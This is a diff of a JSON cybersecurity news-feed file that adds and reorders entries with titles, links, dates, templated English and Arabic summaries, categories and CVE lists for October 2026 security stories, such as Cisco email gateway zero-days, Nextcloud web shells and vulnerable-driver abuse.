@@ -36,6 +36,133 @@
     ]
   },
   {
+    "id": "7f55a7a9001ea1149f3907b8",
+    "title": "Anthropic 'SneakPeek' Flaw Is a Silent Zero-Click Threat",
+    "link": "https://www.darkreading.com/threat-intelligence/new-anthropic-sneakpeek-silent-zero-click-threat",
+    "published": "2026-10-14T20:09:42+00:00",
+    "source": "darkreading.com",
+    "summary_en": "Who: A bug in Claude Code Desktop's preview pane can allow adversaries to quietly steal credentials from developers, including SSH private keys, AWS credentials, and Claude 0Auth tokens.. What: Anthropic 'SneakPeek' Flaw Is a Silent Zero-Click Threat. When: 2026-10-14T20:09:42+00:00. How: Details in the source. Action: See Arabic action below.",
+    "summary_ar": "من: A bug in Claude Code Desktop's preview pane can allow adversaries to quietly steal credentials from developers, including SSH private keys, AWS credentials, and Claude 0Auth tokens.. ماذا: Anthropic 'SneakPeek' Flaw Is a Silent Zero-Click Threat. متى: 2026-10-14T20:09:42+00:00. كيف: تفاصيل إضافية بالمصدر. الإجراء: اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
+    "category": "General",
+    "action": "اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
+    "cves": [],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/bltebc5737d9330c848/6acfd08de9c3113a94cf7694/cat_peek_Seregaff_Getty.jpg?disable=upscale&width=1200&height=630&fit=crop",
+    "sources": [
+      "https://www.darkreading.com/threat-intelligence/new-anthropic-sneakpeek-silent-zero-click-threat"
+    ]
+  },
+  {
+    "id": "8ab3c51ec37145657c09b410",
+    "title": "FBI raids DPRK IT worker laptop farms in Texas, US nationals arrested",
+    "link": "https://www.bleepingcomputer.com/news/security/fbi-raids-dprk-it-worker-laptop-farms-in-texas-us-nationals-arrested/",
+    "published": "2026-10-14T19:41:43+00:00",
+    "source": "bleepingcomputer.com",
+    "summary_en": "Who: FBI raids DPRK IT worker laptop farms in Texas, US nationals arrested. What: FBI raids DPRK IT worker laptop farms in Texas, US nationals arrested. When: 2026-10-14T19:41:43+00:00. How: Details in the source. Action: See Arabic action below.",
+    "summary_ar": "من: FBI raids DPRK IT worker laptop farms in Texas, US nationals arrested. ماذا: FBI raids DPRK IT worker laptop farms in Texas, US nationals arrested. متى: 2026-10-14T19:41:43+00:00. كيف: تفاصيل إضافية بالمصدر. الإجراء: اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
+    "category": "Threat/Attack",
+    "action": "اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
+    "cves": [],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://www.bleepstatic.com/content/hl-images/2026/10/14/doj.jpg",
+    "sources": [
+      "https://www.bleepingcomputer.com/news/security/fbi-raids-dprk-it-worker-laptop-farms-in-texas-us-nationals-arrested/"
+    ]
+  },
+  {
+    "id": "24b402916fcefe4051f1c975",
+    "title": "Security researchers spent 6 days doing their Chromework, built 1B user exploit",
+    "link": "https://www.theregister.com/security/2026/10/14/security-researchers-spent-6-days-doing-their-chromework-built-1b-user-exploit/5303134",
+    "published": "2026-10-14T19:12:33+00:00",
+    "source": "theregister.com",
+    "summary_en": "Who: Researchers at security startup Xbow used OpenAI's GPT-5.6 Sol model to help chain three zero-day vulnerabilities in Chrome into an exploit capable of executing code outside the browser's sandbox on Windows machines.. What: Google fixed all three, and paid the Xbow team a $250,000 bounty, its top reward for a Chrome full-chain exploit.. When: 2026-10-14T19:12:33+00:00. How: Researchers at security startup Xbow used OpenAI's GPT-5.6 Sol model to help chain three zero-day vulnerabilities in Chrome into an exploit capable of executing code outside the browser's sandbox on Windows machines. Action: See Arabic action below.",
+    "summary_ar": "من: Researchers at security startup Xbow used OpenAI's GPT-5.6 Sol model to help chain three zero-day vulnerabilities in Chrome into an exploit capable of executing code outside the browser's sandbox on Windows machines.. ماذا: Google fixed all three, and paid the Xbow team a $250,000 bounty, its top reward for a Chrome full-chain exploit.. متى: 2026-10-14T19:12:33+00:00. كيف: Researchers at security startup Xbow used OpenAI's GPT-5.6 Sol model to help chain three zero-day vulnerabilities in Chrome into an exploit capable of executing code outside the browser's sandbox on Windows machines.. الإجراء: حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
+    "category": "Patch/Update",
+    "action": "حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
+    "cves": [],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://image.theregister.com/5299685.jpg?imageId=5299685&x=0&y=0&cropw=100&croph=100&panox=0&panoy=0&panow=100&panoh=100&width=1200&height=683",
+    "sources": [
+      "https://www.theregister.com/security/2026/10/14/security-researchers-spent-6-days-doing-their-chromework-built-1b-user-exploit/5303134"
+    ]
+  },
+  {
+    "id": "976f4f5fb239546a1517e32d",
+    "title": "Cisco Warns of Active Attacks Exploiting New Critical Secure Email Gateway Vulnerability",
+    "link": "https://thehackernews.com/2026/10/cisco-warns-of-active-attacks.html",
+    "published": "2026-10-14T18:38:56+00:00",
+    "source": "thehackernews.com",
+    "summary_en": "Who: Attackers are exploiting a critical flaw in Cisco Secure Email Gateway that lets a sender with no login write files to the appliance's operating system, Cisco&nbsp;said in an advisory&nbsp;on Wednesday.. What: Cisco Warns of Active Attacks Exploiting New Critical Secure Email Gateway Vulnerability. When: 2026-10-14T18:38:56+00:00. How: The attacker sends an email with a crafted attachment through the gateway and, if it succeeds, could then run commands as root. Action: See Arabic action below.",
+    "summary_ar": "من: Attackers are exploiting a critical flaw in Cisco Secure Email Gateway that lets a sender with no login write files to the appliance's operating system, Cisco&nbsp;said in an advisory&nbsp;on Wednesday.. ماذا: Cisco Warns of Active Attacks Exploiting New Critical Secure Email Gateway Vulnerability. متى: 2026-10-14T18:38:56+00:00. كيف: The attacker sends an email with a crafted attachment through the gateway and, if it succeeds, could then run commands as root.. الإجراء: حدّث التواقيع، احظر الـ IOCs، وفعِّل التوعية للمستخدمين.",
+    "category": "Vulnerability",
+    "action": "حدّث التواقيع، احظر الـ IOCs، وفعِّل التوعية للمستخدمين.",
+    "cves": [],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhh__fSqm3p4u0HNpmeikU6Mo4abprP417Zb3pPW3-6IGrTHwqkbz1CqiuqxL2D0O1PH8J4Ho3_ZpNdJ5VFluIj_KHX6qT0WqZYfHQzyu0cVzGee9EmAZ9pNzsZJZx40UxuKjuz9eNHvuzlMANKOkDr6aRdKWxs8SpJqSi6vDBQTP5ZFgpgqn3Yj2TYNJU/s1600/cisco-0day.jpg",
+    "sources": [
+      "https://thehackernews.com/2026/10/cisco-warns-of-active-attacks.html"
+    ]
+  },
+  {
+    "id": "91d989b5fb66289f25dcd191",
+    "title": "Ledger asks sellers across Asia to halt sales after supply-chain attack",
+    "link": "https://www.bleepingcomputer.com/news/security/ledger-asks-sellers-across-asia-to-halt-sales-after-supply-chain-attack/",
+    "published": "2026-10-14T17:46:50+00:00",
+    "source": "bleepingcomputer.com",
+    "summary_en": "Who: Ledger asks sellers across Asia to halt sales after supply-chain attack. What: Ledger asks sellers across Asia to halt sales after supply-chain attack. When: 2026-10-14T17:46:50+00:00. How: Details in the source. Action: See Arabic action below.",
+    "summary_ar": "من: Ledger asks sellers across Asia to halt sales after supply-chain attack. ماذا: Ledger asks sellers across Asia to halt sales after supply-chain attack. متى: 2026-10-14T17:46:50+00:00. كيف: تفاصيل إضافية بالمصدر. الإجراء: اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
+    "category": "General",
+    "action": "اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
+    "cves": [],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://www.bleepstatic.com/content/hl-images/2026/10/12/ledger.jpg",
+    "sources": [
+      "https://www.bleepingcomputer.com/news/security/ledger-asks-sellers-across-asia-to-halt-sales-after-supply-chain-attack/"
+    ]
+  },
+  {
+    "id": "639d0d6e00a7eca3d11d5db6",
+    "title": "Hackers Backdoor Nextcloud Servers Through Critical Flaw in Collabora’s Built-in CODE App",
+    "link": "https://thehackernews.com/2026/10/hackers-backdoor-nextcloud-servers.html",
+    "published": "2026-10-14T17:38:31+00:00",
+    "source": "thehackernews.com",
+    "summary_en": "Who: Three administrators&nbsp;reported the issue on GitHub, with the first logged attack on September 10.. What: Attackers exploited a flaw in an optional Nextcloud app,&nbsp;Collabora Online - Built-in CODE Server, to plant web shells on Nextcloud servers.. When: 2026-10-14T17:38:31+00:00. How: A web shell is a small file that executes any command an attacker sends via a web request, with the rights of the web server account. Action: See Arabic action below.",
+    "summary_ar": "من: Three administrators&nbsp;reported the issue on GitHub, with the first logged attack on September 10.. ماذا: Attackers exploited a flaw in an optional Nextcloud app,&nbsp;Collabora Online - Built-in CODE Server, to plant web shells on Nextcloud servers.. متى: 2026-10-14T17:38:31+00:00. كيف: A web shell is a small file that executes any command an attacker sends via a web request, with the rights of the web server account.. الإجراء: اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
+    "category": "Threat/Attack",
+    "action": "اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
+    "cves": [],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkZLcjmZtzt6NpWa8x4Wz7EdcOQEW6xYv6DA_mBnwy1ctZZeRAyeSYLES-H_mkr1QOBv72WNuGKwKQ-NN179Rw8BRTcYO38sYwxcbDkg1ISW_qWrCRJ9JfUXh3102OmwrF0HQq6dbSc58VXACXoi_EoI8ysPuSlzB_nBcHuFl9r3QakOsGG9GUm6UVOU8/s1600/nextcloud.jpg",
+    "sources": [
+      "https://thehackernews.com/2026/10/hackers-backdoor-nextcloud-servers.html"
+    ]
+  },
+  {
+    "id": "a7632caf16a4605d27df4528",
+    "title": "Cisco patches new Secure Email Gateway zero-day exploited in attacks",
+    "link": "https://www.bleepingcomputer.com/news/security/cisco-patches-actively-exploited-secure-email-gateway-zero-day/",
+    "published": "2026-10-14T17:29:14+00:00",
+    "source": "bleepingcomputer.com",
+    "summary_en": "Who: Cisco has patched another actively exploited zero-day flaw in its Secure Email Gateway (SEG) that lets remote unauthenticated attackers execute commands with root privileges.. What: Cisco has patched another actively exploited zero-day flaw in its Secure Email Gateway (SEG) that lets remote unauthenticated attackers execute commands with root privileges.. When: 2026-10-14T17:29:14+00:00. How: Cisco has patched another actively exploited zero-day flaw in its Secure Email Gateway (SEG) that lets remote unauthenticated attackers execute commands with root privileges. Action: See Arabic action below.",
+    "summary_ar": "من: Cisco has patched another actively exploited zero-day flaw in its Secure Email Gateway (SEG) that lets remote unauthenticated attackers execute commands with root privileges.. ماذا: Cisco has patched another actively exploited zero-day flaw in its Secure Email Gateway (SEG) that lets remote unauthenticated attackers execute commands with root privileges.. متى: 2026-10-14T17:29:14+00:00. كيف: Cisco has patched another actively exploited zero-day flaw in its Secure Email Gateway (SEG) that lets remote unauthenticated attackers execute commands with root privileges.. الإجراء: حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
+    "category": "Patch/Update",
+    "action": "حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
+    "cves": [],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://www.bleepstatic.com/content/hl-images/2026/10/14/Cisco.jpg",
+    "sources": [
+      "https://www.bleepingcomputer.com/news/security/cisco-patches-actively-exploited-secure-email-gateway-zero-day/",
+      "https://www.bleepingcomputer.com/news/security/new-cisco-secure-email-zero-day-exploited-to-execute-commands-as-root/"
+    ]
+  },
+  {
     "id": "6051d8ed862c2daf34ecd900",
     "title": "Ivanti patches Connect Secure zero-day after researchers confirm in-the-wild attacks",
     "link": "https://www.theregister.com/security/2026/10/14/ivanti-patches-connect-secure-zero-day-after-researchers-confirm-in-the-wild-attacks/5303095",
@@ -53,6 +180,24 @@
     "image": "https://image.theregister.com/232983.jpg?imageId=232983&x=0&y=0&cropw=100&croph=100&panox=0&panoy=0&panow=100&panoh=100&width=1200&height=683",
     "sources": [
       "https://www.theregister.com/security/2026/10/14/ivanti-patches-connect-secure-zero-day-after-researchers-confirm-in-the-wild-attacks/5303095"
+    ]
+  },
+  {
+    "id": "78b0d9b2dfa117c3a73cc061",
+    "title": "Microsoft Disrupts 3 Phishing Kits Linked to Over 1 Billion Scam Messages",
+    "link": "https://thehackernews.com/2026/10/microsoft-disrupts-3-phishing-kits.html",
+    "published": "2026-10-14T17:09:15+00:00",
+    "source": "thehackernews.com",
+    "summary_en": "Who: Microsoft and Health-ISAC, along with the Japan Cybercrime Control Center (JC3) and a coalition of private sector companies, such as Resecurity, Cloudflare, Oracle, Proofpoint, and TRM Labs, announced the disruption of three phishing kits, CoGUI (aka NX or FA), Haozi (aka Phoenix), and Iron Man System.. What: Microsoft and Health-ISAC, along with the Japan Cybercrime Control Center (JC3) and a coalition of private sector companies, such as Resecurity, Cloudflare, Oracle, Proofpoint, and TRM Labs, announced the disruption of three phishing kits, CoGUI (aka NX or FA), Haozi (aka Phoenix), and Iron Man System.. When: 2026-10-14T17:09:15+00:00. How: Microsoft and Health-ISAC, along with the Japan Cybercrime Control Center (JC3) and a coalition of private sector companies, such as Resecurity, Cloudflare, Oracle, Proofpoint, and TRM Labs, announced the disruption of three phishing kits, CoGUI (aka NX or FA), Haozi (aka Phoenix), and Iron Man System. Action: See Arabic action below.",
+    "summary_ar": "من: Microsoft and Health-ISAC, along with the Japan Cybercrime Control Center (JC3) and a coalition of private sector companies, such as Resecurity, Cloudflare, Oracle, Proofpoint, and TRM Labs, announced the disruption of three phishing kits, CoGUI (aka NX or FA), Haozi (aka Phoenix), and Iron Man System.. ماذا: Microsoft and Health-ISAC, along with the Japan Cybercrime Control Center (JC3) and a coalition of private sector companies, such as Resecurity, Cloudflare, Oracle, Proofpoint, and TRM Labs, announced the disruption of three phishing kits, CoGUI (aka NX or FA), Haozi (aka Phoenix), and Iron Man System.. متى: 2026-10-14T17:09:15+00:00. كيف: Microsoft and Health-ISAC, along with the Japan Cybercrime Control Center (JC3) and a coalition of private sector companies, such as Resecurity, Cloudflare, Oracle, Proofpoint, and TRM Labs, announced the disruption of three phishing kits, CoGUI (aka NX or FA), Haozi (aka Phoenix), and Iron Man System.. الإجراء: حدّث التواقيع، احظر الـ IOCs، وفعِّل التوعية للمستخدمين.",
+    "category": "Threat/Attack",
+    "action": "حدّث التواقيع، احظر الـ IOCs، وفعِّل التوعية للمستخدمين.",
+    "cves": [],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtmZA0sGFnGRVBoPOHXGNOr-Q1MpdbCUNVrfxBTV6z_URgCka1DOH4xcc_WuismhU3W1BEiostTKZetIhtrFyXrInKdz_jqK6Dtia5TDOqRiu4rkktKmF2Iz1br28coCyU3c5td-yrINUgjYIdwG-7q_n1fEZT_mumUoVBp2HfNPKHnqC3jTryRDL7hxAL/s1600/phish-shop.jpg",
+    "sources": [
+      "https://thehackernews.com/2026/10/microsoft-disrupts-3-phishing-kits.html"
     ]
   },
   {
@@ -520,7 +665,7 @@
     "cves": [],
     "cvss": [],
     "impacted": [],
-    "image": "",
+    "image": "https://image.theregister.com/5303006.jpg?imageId=5303006&x=38.39&y=32.34&cropw=52&croph=44.18&panox=38.39&panoy=32.34&panow=52&panoh=44.18&width=1200&height=683",
     "sources": [
       "https://www.theregister.com/security/2026/10/14/openai-engineer-charged-after-boardroom-bug-found-wrapped-in-toilet-paper/5303000"
     ]
@@ -1260,6 +1405,26 @@
     ]
   },
   {
+    "id": "5ebfe20c11773fc69fdec600",
+    "title": "Bring Your Own Vulnerable Driver: The Trust Gap Attackers Operate Inside",
+    "link": "https://www.sentinelone.com/blog/bring-your-own-vulnerable-driver-the-trust-gap-attackers-operate-inside/",
+    "published": "2026-10-13T16:40:50+00:00",
+    "source": "sentinelone.com",
+    "summary_en": "Who: The anchor is the signing trust itself: revocation, signature metadata, and the slow death of cross-signed-driver trust.. What: The operating system's kernel-mode signing policy accepts end-entity certificates issued before July 29, 2015 if they chain to a cross-signed authority.. When: 2026-10-13T16:40:50+00:00. How: A signature is the scarce thing. Action: See Arabic action below.",
+    "summary_ar": "من: The anchor is the signing trust itself: revocation, signature metadata, and the slow death of cross-signed-driver trust.. ماذا: The operating system's kernel-mode signing policy accepts end-entity certificates issued before July 29, 2015 if they chain to a cross-signed authority.. متى: 2026-10-13T16:40:50+00:00. كيف: A signature is the scarce thing.. الإجراء: حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
+    "category": "Data Breach",
+    "action": "حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
+    "cves": [
+      "cve-2021-21551"
+    ],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltaf4cd26a3a9624eb/6a3429e88f704e56cfe8169c/sentinelone-logo.jpg",
+    "sources": [
+      "https://www.sentinelone.com/blog/bring-your-own-vulnerable-driver-the-trust-gap-attackers-operate-inside/"
+    ]
+  },
+  {
     "id": "3770e65c491fe5dfacc0fc5b",
     "title": "GitHub Tightens npm Publishing After Flaw Left 1,500+ Packages Vulnerable to Hijacking",
     "link": "https://thehackernews.com/2026/10/github-tightens-npm-publishing-after.html",
@@ -1275,6 +1440,27 @@
     "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3aDWaWT6PmRDL9d6tHPDisxclb_Ak7YZIxuS02EUFvNaWrc4_UKwUqW0RI1KT3r8zsneOguD6b85yg8mf3gAzZZOGuLi-mXckG_yzwmXXb3IchTBSVeRvPlUo7QU4Kp4yiM6QqPshmo4p0GQ55XZPTEDc0DZn9N84S_ZibZ4rkXuhZ3OvoHNCYH-wk0k-/s1600/git-npm.jpg",
     "sources": [
       "https://thehackernews.com/2026/10/github-tightens-npm-publishing-after.html"
+    ]
+  },
+  {
+    "id": "7e85fa08667eaf540cd9d23d",
+    "title": "Bring Your Own Vulnerable Driver: How EDR Killing Became an Industry",
+    "link": "https://www.sentinelone.com/blog/bring-your-own-vulnerable-driver-how-edr-killing-became-an-industry/",
+    "published": "2026-10-13T16:18:18+00:00",
+    "source": "sentinelone.com",
+    "summary_en": "Who: Bring Your Own Vulnerable Driver: How EDR Killing Became an Industry. What: It ships versions, fixes bugs, and reuses code across releases.. When: 2026-10-13T16:18:18+00:00. How: In August 2024, public reporting disclosed EDRKillShifter, abusing the RentDrv2 and ThreatFireMonitor drivers and first seen in a RansomHub attack. Action: See Arabic action below.",
+    "summary_ar": "من: Bring Your Own Vulnerable Driver: How EDR Killing Became an Industry. ماذا: It ships versions, fixes bugs, and reuses code across releases.. متى: 2026-10-13T16:18:18+00:00. كيف: In August 2024, public reporting disclosed EDRKillShifter, abusing the RentDrv2 and ThreatFireMonitor drivers and first seen in a RansomHub attack.. الإجراء: حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
+    "category": "Patch/Update",
+    "action": "حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
+    "cves": [
+      "CVE-2024-51324",
+      "CVE-2025-68947"
+    ],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blt7417f3903aaccd4c/6ab6b32b60452d450f56c648/BYOVD_series.jpg",
+    "sources": [
+      "https://www.sentinelone.com/blog/bring-your-own-vulnerable-driver-how-edr-killing-became-an-industry/"
     ]
   },
   {
@@ -1858,24 +2044,6 @@
     ]
   },
   {
-    "id": "15f1ad45be3bfe100624c886",
-    "title": "U.S. Government Disrupts FAMOUS CHOLLIMA Operation with CrowdStrike Assistance",
-    "link": "https://www.crowdstrike.com/en-us/blog/fbi-disrupts-famous-chollima-operation-with-crowdstrike-assistance/",
-    "published": "2026-10-13T05:00:00+00:00",
-    "source": "crowdstrike.com",
-    "summary_en": "Who: Government Disrupts FAMOUS CHOLLIMA Operation with CrowdStrike Assistance. What: U.S. Government Disrupts FAMOUS CHOLLIMA Operation with CrowdStrike Assistance. When: 2026-10-13T05:00:00+00:00. How: Details in the source. Action: See Arabic action below.",
-    "summary_ar": "من: Government Disrupts FAMOUS CHOLLIMA Operation with CrowdStrike Assistance. ماذا: U.S. Government Disrupts FAMOUS CHOLLIMA Operation with CrowdStrike Assistance. متى: 2026-10-13T05:00:00+00:00. كيف: تفاصيل إضافية بالمصدر. الإجراء: اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "category": "General",
-    "action": "اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "cves": [],
-    "cvss": [],
-    "impacted": [],
-    "image": "https://assets.crowdstrike.com/is/image/crowdstrikeinc/WebShareDefaultImage",
-    "sources": [
-      "https://www.crowdstrike.com/en-us/blog/fbi-disrupts-famous-chollima-operation-with-crowdstrike-assistance/"
-    ]
-  },
-  {
     "id": "b79fbc206a1a3030a9bf5bc4",
     "title": "October 2026 Patch Tuesday: 1,413 CVEs Include Three Zero-Days and 75 Critical Vulnerabilities",
     "link": "https://www.crowdstrike.com/en-us/blog/patch-tuesday-analysis-october-2026/",
@@ -1891,6 +2059,24 @@
     "image": "https://assets.crowdstrike.com/is/image/crowdstrikeinc/WebShareDefaultImage",
     "sources": [
       "https://www.crowdstrike.com/en-us/blog/patch-tuesday-analysis-october-2026/"
+    ]
+  },
+  {
+    "id": "15f1ad45be3bfe100624c886",
+    "title": "U.S. Government Disrupts FAMOUS CHOLLIMA Operation with CrowdStrike Assistance",
+    "link": "https://www.crowdstrike.com/en-us/blog/fbi-disrupts-famous-chollima-operation-with-crowdstrike-assistance/",
+    "published": "2026-10-13T05:00:00+00:00",
+    "source": "crowdstrike.com",
+    "summary_en": "Who: Government Disrupts FAMOUS CHOLLIMA Operation with CrowdStrike Assistance. What: U.S. Government Disrupts FAMOUS CHOLLIMA Operation with CrowdStrike Assistance. When: 2026-10-13T05:00:00+00:00. How: Details in the source. Action: See Arabic action below.",
+    "summary_ar": "من: Government Disrupts FAMOUS CHOLLIMA Operation with CrowdStrike Assistance. ماذا: U.S. Government Disrupts FAMOUS CHOLLIMA Operation with CrowdStrike Assistance. متى: 2026-10-13T05:00:00+00:00. كيف: تفاصيل إضافية بالمصدر. الإجراء: اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
+    "category": "General",
+    "action": "اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
+    "cves": [],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://assets.crowdstrike.com/is/image/crowdstrikeinc/WebShareDefaultImage",
+    "sources": [
+      "https://www.crowdstrike.com/en-us/blog/fbi-disrupts-famous-chollima-operation-with-crowdstrike-assistance/"
     ]
   },
   {
@@ -2932,6 +3118,24 @@
     ]
   },
   {
+    "id": "7048bd1252ed9c3d1345d1d3",
+    "title": "5 Years of SentinelOne ThreatOps: Defense from the Ground Up to Global Threat Championships",
+    "link": "https://www.sentinelone.com/blog/5-years-of-sentinelone-threatops-defense-from-the-ground-up-to-global-threat-championships/",
+    "published": "2026-10-09T17:48:39+00:00",
+    "source": "sentinelone.com",
+    "summary_en": "Who: Presented in partnership with Dropzone AI, Google Cloud, and Mimecast, the Sentinels League features a $100,000 prize pool.. What: 5 Years of SentinelOne ThreatOps: Defense from the Ground Up to Global Threat Championships. When: 2026-10-09T17:48:39+00:00. How: In May of 2020, SE Joseph Poyner sketched a vision in a team chat channel: standing up a Capture the Flag (CTF) game that would walk players through the product, requiring them to search deep visibility telemetry for malicious process connections to find hidden flags. Action: See Arabic action below.",
+    "summary_ar": "من: Presented in partnership with Dropzone AI, Google Cloud, and Mimecast, the Sentinels League features a $100,000 prize pool.. ماذا: 5 Years of SentinelOne ThreatOps: Defense from the Ground Up to Global Threat Championships. متى: 2026-10-09T17:48:39+00:00. كيف: In May of 2020, SE Joseph Poyner sketched a vision in a team chat channel: standing up a Capture the Flag (CTF) game that would walk players through the product, requiring them to search deep visibility telemetry for malicious process connections to find hidden flags.. الإجراء: اعزل الأنظمة المتأثرة، فعِّل incident response، وأخطر الأطراف المعنية.",
+    "category": "Data Breach",
+    "action": "اعزل الأنظمة المتأثرة، فعِّل incident response، وأخطر الأطراف المعنية.",
+    "cves": [],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltaf4cd26a3a9624eb/6a3429e88f704e56cfe8169c/sentinelone-logo.jpg",
+    "sources": [
+      "https://www.sentinelone.com/blog/5-years-of-sentinelone-threatops-defense-from-the-ground-up-to-global-threat-championships/"
+    ]
+  },
+  {
     "id": "43d8a91bc2a7ef236d41a506",
     "title": "FBI Arrests Another ShinyHunters Suspect Reportedly Involved in Its Jobs Portal Hack",
     "link": "https://thehackernews.com/2026/10/fbi-arrests-another-shinyhunters.html",
@@ -2947,6 +3151,122 @@
     "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTRCTw1H9kT8UEVJYmaRrhHvMQEYFuE2TZqB62Wnxz8y4RIYOMald4OYO45ujfgSp0ixhgWVKb3_nJzoKV6gNuu_cKaN2Evnr9u7FlnwsPTPm9TPpikkUR-83UL3VrknNBzITPeFC8f1PKpYMwvH_AbBAFWcbPl61vUXJK1m0xJ_C5QYDIAGi_Ya-A5Tc/s1600/kash.jpg",
     "sources": [
       "https://thehackernews.com/2026/10/fbi-arrests-another-shinyhunters.html"
+    ]
+  },
+  {
+    "id": "062397636350e392c67c65ca",
+    "title": "The Good, the Bad and the Ugly in  Cybersecurity - Week 41 (2026)",
+    "link": "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-41-8",
+    "published": "2026-10-09T17:31:35+00:00",
+    "source": "sentinelone.com",
+    "summary_en": "Who: The Bad | Human Phishers Impersonate AI Ad Portals to Intercept Credentials and MFA Codes Researchers uncovered a human-operated phishing platform impersonating advertising management portals for popular AI chatbots, including ChatGPT, Gemini, Claude, Perplexity, Meta Muse, and Manus.. What: The reported detention follows an ongoing federal investigation on ShinyHunters’ self-claimed breach of the FBI’s administrative systems.. When: 2026-10-09T17:31:35+00:00. How: Following his arrest, sources report that Khader ( aka Rey) has been cooperating with the FBI and international agencies to identify and locate the remaining co-conspirators, leveraging his digital devices and communication logs. Action: See Arabic action below.",
+    "summary_ar": "من: The Bad | Human Phishers Impersonate AI Ad Portals to Intercept Credentials and MFA Codes Researchers uncovered a human-operated phishing platform impersonating advertising management portals for popular AI chatbots, including ChatGPT, Gemini, Claude, Perplexity, Meta Muse, and Manus.. ماذا: The reported detention follows an ongoing federal investigation on ShinyHunters’ self-claimed breach of the FBI’s administrative systems.. متى: 2026-10-09T17:31:35+00:00. كيف: Following his arrest, sources report that Khader ( aka Rey) has been cooperating with the FBI and international agencies to identify and locate the remaining co-conspirators, leveraging his digital devices and communication logs.. الإجراء: حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
+    "category": "Data Breach",
+    "action": "حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
+    "cves": [
+      "CVE-2022-20775",
+      "CVE-2024-55591",
+      "CVE-2025-12480",
+      "CVE-2025-14174",
+      "CVE-2025-24472",
+      "CVE-2025-31277",
+      "CVE-2025-43510",
+      "CVE-2025-43520",
+      "CVE-2025-43529",
+      "CVE-2025-55182",
+      "CVE-2025-59718",
+      "CVE-2025-59719",
+      "CVE-2025-61884",
+      "CVE-2025-66478",
+      "CVE-2025-68668",
+      "CVE-2026-0257",
+      "CVE-2026-0300",
+      "CVE-2026-20127",
+      "CVE-2026-20131",
+      "CVE-2026-20230",
+      "CVE-2026-20245",
+      "CVE-2026-20700",
+      "CVE-2026-21262",
+      "CVE-2026-21509",
+      "CVE-2026-21589",
+      "CVE-2026-21858",
+      "CVE-2026-21877",
+      "CVE-2026-24858",
+      "CVE-2026-25253",
+      "CVE-2026-26127",
+      "CVE-2026-26144",
+      "CVE-2026-33032",
+      "CVE-2026-33824",
+      "CVE-2026-36425",
+      "CVE-2026-3909",
+      "CVE-2026-3910",
+      "CVE-2026-41091",
+      "CVE-2026-45498",
+      "CVE-2026-50656",
+      "CVE-2026-5281",
+      "cve-2022-20775",
+      "cve-2024-55591",
+      "cve-2025-12480",
+      "cve-2025-55182",
+      "cve-2025-61884",
+      "cve-2026-0257",
+      "cve-2026-21589",
+      "cve-2026-21858",
+      "cve-2026-2441",
+      "cve-2026-36425"
+    ],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://images.contentstack.io/v3/assets/blt53c99b43892c2378/bltaf4cd26a3a9624eb/6a3429e88f704e56cfe8169c/sentinelone-logo.jpg",
+    "sources": [
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-41-8",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-40-8",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-39-8",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-35-8/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-34-8/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-33-8/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-32-8/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-31-8/",
